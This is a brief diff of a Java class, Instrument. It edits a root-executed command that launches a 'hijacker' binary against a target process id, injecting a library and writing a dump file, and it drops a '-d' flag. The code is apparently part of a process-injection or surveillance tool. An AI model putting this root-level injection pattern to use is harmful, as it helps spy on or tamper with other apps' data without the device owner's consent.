@@ -71,7 +71,7 @@ public class Instrument {
 		int pid = getProcessPid();
 		
 		if (pid > 0) {
-			Execute.executeRoot("\"" + path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + " -d\"");
+			Execute.executeRoot("\"" + path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\"" /*" -d\""*/);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getProcessPid): unable to get pid");
